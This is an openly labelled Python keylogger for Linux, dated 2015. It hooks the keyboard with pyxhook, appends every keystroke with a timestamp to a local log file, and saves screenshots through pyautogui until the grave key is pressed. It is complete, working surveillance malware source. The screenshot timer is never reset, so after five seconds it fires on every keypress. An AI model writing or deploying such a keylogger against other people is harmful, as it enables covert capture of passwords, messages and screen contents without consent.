"""
Copyright (c) 2015, Aman Deep
All rights reserved.


A simple keylogger witten in python for linux platform
All keystrokes are recorded in a log file.

The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
from datetime import datetime
import pyautogui

#change this to your log file's path
folder='/home/simon/Desktop/'
log_file=folder+'file.log'
#global time
time=datetime.now()
#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')

  #we also register the time stamp of the keystroke
  event_time=event.Key + "\t" + str(datetime.now())
  fob.write(event_time)
  fob.write('\n')

  #Every 5 sec we take a screenshot
  if ((datetime.now()-time).total_seconds()>5):
        pic = pyautogui.screenshot()
        out_pic='screenshot_'+str(datetime.now())+'.png'
        pic.save(out_pic)

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
